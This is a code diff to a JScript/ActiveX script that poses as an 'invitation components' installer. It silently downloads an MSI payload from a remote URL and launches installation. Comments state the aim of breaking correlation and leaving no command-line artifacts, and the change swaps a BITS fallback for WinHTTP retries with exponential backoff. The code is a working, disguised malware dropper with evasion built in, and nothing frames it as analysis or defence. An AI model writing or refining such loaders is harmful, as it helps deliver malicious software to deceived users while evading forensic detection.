@@ -115,7 +115,7 @@ function init() {
   } catch(e) { fail("Initialization failed: " + e.message); }
 }
 
-// DOWNLOAD PHASE - STAGED TO BREAK CORRELATION + BITS FALLBACK
+// DOWNLOAD PHASE - STAGED TO BREAK CORRELATION + WINHTTP RETRY FALLBACK
 function startDownload() {
   state = "downloading";
   setStatus("Downloading invitation components&hellip;");
@@ -125,6 +125,7 @@ function startDownload() {
     try { fso.CreateFolder(stagingDir); } catch(e) {}
     var stagingPath = stagingDir + "\\payload.tmp";
     
+    // PRIMARY DOWNLOAD ATTEMPT
     var wHead = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
     wHead.SetTimeouts(15000, 30000, 60000, 120000);
     wHead.Open("HEAD", MSI_URL, false);
@@ -160,33 +161,41 @@ function startDownload() {
       startInstall();
     } else { fail("Server returned status: " + w.Status); }
   } catch(e) {
-    // BITS-BASED FALLBACK (NO READABLE COMMAND-LINE ARTIFACTS)
+    // WINHTTP RETRY FALLBACK WITH EXPONENTIAL BACKOFF (NO CLI ARTIFACTS)
     try {
-      setStatus("Retrying via background transfer service&hellip;");
-      var bitsMgr = new ActiveXObject("BackgroundCopyManager");
-      var bitsJob = bitsMgr.CreateJob("EventUpdater", 3); // BG_JOB_TYPE_DOWNLOAD
-      bitsJob.AddFile(MSI_URL, msiPath);
-      bitsJob.Resume();
+      setStatus("Retrying via secure channel&hellip;");
+      var maxRetries = 3;
+      var baseDelay = 2000; // 2 seconds
       
-      // WAIT FOR BITS TRANSFER TO COMPLETE
-      var maxWait = 120000; // 2-minute timeout
-      var startTime = new Date().getTime();
-      while (new Date().getTime() - startTime < maxWait) {
+      for(var i=0; i<maxRetries; i++) {
         try {
-          var jobState = bitsJob.JobState;
-          if (jobState === 4) break; // BG_JOB_STATE_TRANSFERRED
-          if (jobState === 5 || jobState === 6) throw new Error("BITS transfer failed");
-        } catch(e2) {}
-        WScript.Sleep(500);
+          var retryW = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+          retryW.SetTimeouts(15000, 30000, 60000, 120000);
+          retryW.Open("GET", MSI_URL, false);
+          retryW.SetRequestHeader("User-Agent", UA_STR);
+          retryW.Send();
+          
+          if (retryW.Status === 200) {
+            var retryS = new ActiveXObject("ADODB.Stream");
+            retryS.Type = 1; retryS.Mode = 3; retryS.Open();
+            retryS.Write(retryW.ResponseBody);
+            retryS.SaveToFile(msiPath, 2);
+            retryS.Close();
+            
+            if (fso.FileExists(msiPath)) {
+              progress = 85; 
+              setBar(progress); 
+              startInstall(); 
+              return; // Exit on success
+            }
+          }
+        } catch(e2) { /* Retry next iteration */ }
+        
+        // Exponential backoff: 2s → 4s → 8s
+        if (i < maxRetries - 1) WScript.Sleep(baseDelay * Math.pow(2, i));
       }
       
-      if (fso.FileExists(msiPath)) { 
-        progress = 85; 
-        setBar(progress); 
-        startInstall(); 
-      } else { 
-        fail("All download methods failed."); 
-      }
+      fail("All download methods failed after retries.");
     } catch(e2) { 
       fail("Download failed: " + e2.message); 
     }
